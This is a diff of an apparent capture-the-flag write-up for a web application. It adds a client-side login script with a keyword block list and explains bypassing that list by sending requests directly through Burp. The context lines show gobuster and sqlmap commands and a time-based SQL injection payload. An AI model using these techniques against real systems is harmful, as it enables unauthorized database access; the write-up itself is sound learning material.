@@ -16,7 +16,7 @@ $ gobuster dir -u http://<target> -w /usr/share/wordlists/seclists/Discovery/Web
 
 Interesting files: `composer.lock`, **`composer.json`**
 
-From `composer.lock`, I found out that the application uses Twig.
+From `composer.json`, I found out that the application uses Twig.
 
 #### Source code review
 
@@ -54,6 +54,49 @@ From this note, we can understand that ...
 ### Exploring the application
 
 #### (1) Normal user login
+
+Using the GUI to test the payload `'` returns an error message. Looking at the sources, I found a file `script.js` that works to block a few keywords. Thus, I used Burp suite to send the API request directly to the server instead.
+
+_**script.js**_:
+
+```javascript
+$("#login-form").on("submit", function(e) {
+    e.preventDefault();
+    var username = $("#email").val();
+    var password = $("#pwd").val();
+
+	const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
+            for (let keyword of invalidKeywords) {
+                if (username.includes(keyword)) {
+                    alert('Invalid keywords detected');
+                   return false;
+                }
+            }
+
+    $.ajax({
+        url: 'functions.php',
+        type: 'POST',
+        data: {
+            username: username,
+            password: password,
+            function: "login"
+        },
+        dataType: 'json',
+        success: function(data) {
+            if (data.status == "success") {
+                if (data.auth_type == 0){
+                    window.location = 'dashboard.php';
+                }else{
+                    window.location = 'dashboard.php';
+                }
+            } else {
+                $("#messagess").html('<div class="alert alert-danger" role="alert">' + data.message + '</div>');
+            }
+        }
+    });
+});
+
+```
 
 ```http
 POST /functions.php HTTP/1.1
@@ -112,7 +155,7 @@ $ sqlmap -r login.txt --risk=3 --level=5
 ' RLIKE SLEEP(3) -- n 
 ```
 
-#### (2) Edit leaderboard
+#### (2) Edit leader board
 
 After the successful injection on the login form, we are able to view the dashboard page, which presents us with a method to edit the leader board table:
 
